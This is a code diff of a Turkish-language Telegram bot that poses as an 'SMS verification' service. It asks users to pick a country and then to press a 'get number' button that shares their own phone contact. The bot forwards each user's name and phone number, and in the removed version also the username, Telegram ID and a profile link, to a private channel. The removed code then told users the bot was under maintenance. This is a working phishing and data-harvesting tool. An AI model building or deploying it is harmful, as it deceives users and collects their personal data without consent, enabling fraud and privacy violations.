@@ -35,91 +35,68 @@ kullanici_durum = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    kullanici_adi = user.username or user.first_name
-
-    mesaj = (
-        f"✨ Hoş Geldiniz {kullanici_adi}! ✨\n"
-        "SMS doğrulama botuna hoş geldiniz.\n\n"
-        "👇 İşleme başlamak için bir seçenek seçin:"
-    )
-
-    butonlar = [[KeyboardButton("💬 SMS Onayla")]]
+    ad = user.username or user.first_name
     await update.message.reply_text(
-        mesaj,
-        reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
+        f"✨ Hoş geldin {ad}\nSMS doğrulama botu",
+        reply_markup=ReplyKeyboardMarkup(
+            [[KeyboardButton("💬 SMS Onayla")]],
+            resize_keyboard=True
+        )
     )
 
 async def sms_onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    secilen_ulkeler = random.sample(ulkeler, 15)
-    butonlar = [[KeyboardButton(f"{bayrak} {isim}")] for isim, bayrak in secilen_ulkeler]
+    secilen = random.sample(ulkeler, 15)
+    butonlar = [[KeyboardButton(f"{b} {i}")] for i, b in secilen]
     butonlar.append([KeyboardButton("🔙 Geri Dön")])
-
     await update.message.reply_text(
-        "Lütfen bir ülke seçin:",
+        "Bir ülke seç:",
         reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
     )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
-    user_id = update.effective_user.id
+    uid = update.effective_user.id
 
     if text == "💬 SMS Onayla":
         await sms_onayla(update, context)
-
     elif text == "🔙 Geri Dön":
         await start(update, context)
-
-    elif any(text == f"{bayrak} {isim}" for isim, bayrak in ulkeler):
-        kullanici_durum[user_id] = "numara_bekleniyor"
-        buton = KeyboardButton("📱 Numara al", request_contact=True)
-        markup = ReplyKeyboardMarkup(
-            [[buton], [KeyboardButton("🔙 Geri Dön")]],
-            resize_keyboard=True
-        )
+    elif any(text == f"{b} {i}" for i, b in ulkeler):
+        kullanici_durum[uid] = True
         await update.message.reply_text(
-            "Aşağıdaki butona basarak numaranızı alabilirsiniz",
-            reply_markup=markup
+            "Numaranı gönder:",
+            reply_markup=ReplyKeyboardMarkup(
+                [[KeyboardButton("📱 Numara Al", request_contact=True)]],
+                resize_keyboard=True
+            )
         )
 
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    contact: Contact = update.message.contact
-    user = update.effective_user
-    user_id = user.id
+    uid = update.effective_user.id
+    if not kullanici_durum.get(uid):
+        return
 
-    if kullanici_durum.get(user_id) == "numara_bekleniyor":
-        kayit_zamani = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
-        kullanici_adi = user.username or "Yok"
+    c: Contact = update.message.contact
+    zaman = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
 
-        mesaj = (
-            "☎️ YENİ TELEFON NUMARASI ALINDI\n\n"
-            f"👤 Adı: {contact.first_name}\n"
-            f"🔑 Kullanıcı Adı: {kullanici_adi}\n"
-            f"🆔 Telegram ID: {user_id}\n"
-            f"📱 Telefon Numarası: +{contact.phone_number}\n"
-            f"⏰ Kayıt Zamanı: {kayit_zamani}"
+    await context.bot.send_message(
+        chat_id=KANAL_ID,
+        text=(
+            "☎️ NUMARA ALINDI\n\n"
+            f"👤 {c.first_name}\n"
+            f"📱 +{c.phone_number}\n"
+            f"⏰ {zaman}"
         )
+    )
 
-        profil_url = f"tg://user?id={user_id}"
-        buton = InlineKeyboardMarkup(
-            [[InlineKeyboardButton("👤 Profili Gör", url=profil_url)]]
-        )
-
-        await context.bot.send_message(
-            chat_id=KANAL_ID,
-            text=mesaj,
-            reply_markup=buton
-        )
-
-        await update.message.reply_text("Bot Bakımda")
-        kullanici_durum[user_id] = None
+    await update.message.reply_text("Alındı ✅")
+    kullanici_durum[uid] = False
 
 def main():
     app = ApplicationBuilder().token(TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-
     app.run_polling()
 
 if __name__ == "__main__":
